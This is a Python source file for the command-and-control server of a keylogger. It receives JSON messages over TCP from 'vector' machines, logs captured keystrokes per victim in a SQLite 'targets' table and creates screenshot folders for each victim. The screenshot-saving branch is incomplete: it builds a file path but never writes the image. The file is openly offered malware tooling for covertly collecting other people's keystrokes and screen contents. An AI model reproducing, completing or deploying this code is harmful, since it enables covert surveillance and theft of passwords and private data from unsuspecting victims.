import base64
import socket
import sqlite3
import threading
import time
from datetime import datetime
import json
from enum import Enum
import os
from io import BytesIO

from PIL import Image

screenshots_folder_path = './screenshots/'

class KeyLoggerDataType(Enum):
    text = 'text'
    screenshot = 'screenshot'

# Initialize database connection and create table if it doesn't exist
def init_db():
    conn = sqlite3.connect('client_data.db')
    cursor = conn.cursor()

    cursor.execute('''
           CREATE TABLE IF NOT EXISTS targets (
               id INTEGER PRIMARY KEY AUTOINCREMENT,
               client_address TEXT UNIQUE,
               client_pc_name TEXT
           )
   ''')

    cursor.execute('''
        CREATE TABLE IF NOT EXISTS logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT,
            data TEXT,
            target_id INTEGER,
            FOREIGN KEY (target_id) REFERENCES targets(id)
        )
    ''')
    conn.commit()
    conn.close()


def get_target_id(client_address, vector_pc_name):
    conn = sqlite3.connect('client_data.db')
    cursor = conn.cursor()

    # Check if the target already exists
    cursor.execute('SELECT id FROM targets WHERE client_address = ?', (client_address,))
    result = cursor.fetchone()

    # If not found, insert a new target and get its ID
    if result is None:
        cursor.execute('INSERT INTO targets (client_address, client_pc_name) VALUES (?, ?)', (client_address, vector_pc_name))
        conn.commit()
        target_id = cursor.lastrowid
    else:
        target_id = result[0]

    conn.close()
    return target_id


def log_data(client_address, data, vector_pc_name):
    target_id = get_target_id(client_address, vector_pc_name)
    conn = sqlite3.connect('client_data.db')
    cursor = conn.cursor()
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    cursor.execute('INSERT INTO logs (timestamp, data, target_id) VALUES (?, ?, ?)',
                   (timestamp, data, target_id))
    conn.commit()
    conn.close()

def waitForDataFromVector(client_socket, client_address):
    print(f'Connection established with {client_address}')
    try:
        while True:
            size_bytes = client_socket.recv(4)
            if not size_bytes:
                return

            payload_size = int.from_bytes(size_bytes, byteorder='big')

            print(f'Payload size: {payload_size}')

            # Now read the actual payload based on the size
            data_buffer = b''
            while len(data_buffer) < payload_size:
                chunk = client_socket.recv(payload_size - len(data_buffer))
                if not chunk:
                    break
                data_buffer += chunk

            if not data_buffer:
                break

            #check if data received is image or something

            data_dictionary = json.loads(data_buffer.decode("utf-8"))
            vector_pc_name = data_dictionary["data"]["vector"]
            data_type = data_dictionary["data"]["data_type"]
            actual_data = data_dictionary["data"]["info"]

            if data_type == KeyLoggerDataType.text.value:
                # Log data to the database
                log_data(client_address[0], data_dictionary["data"]["info"], vector_pc_name)
                print(f'Received data: {data_buffer.decode("utf-8")}')
            elif data_type == KeyLoggerDataType.screenshot.value:
                #save ss to a folder
                global screenshots_folder_path

                #create folder for vector if not existing
                screenshot_folder_path = os.path.join(screenshots_folder_path, vector_pc_name + ' --- ' + client_address[0])
                os.makedirs(screenshot_folder_path, exist_ok=True)

                current_timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                print("Current Timestamp:", current_timestamp)

                screenshot_file_path = os.path.join(screenshot_folder_path, current_timestamp + '.jpg' )



    except json.JSONDecodeError as e:
        print("Failed to decode JSON:", e)
    finally:
        client_socket.close()

def start_tcp_server(host='localhost', port=3000):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
        server_socket.bind((host, port))
        server_socket.listen()
        print(f'Server listening on {host}:{port}')
        while True:
            # Wait for a connection
            client_socket, client_address = server_socket.accept()
            client_thread = threading.Thread(
                target=waitForDataFromVector, args=(client_socket, client_address)
            )
            client_thread.start()

if __name__ == "__main__":
    init_db()
    start_tcp_server()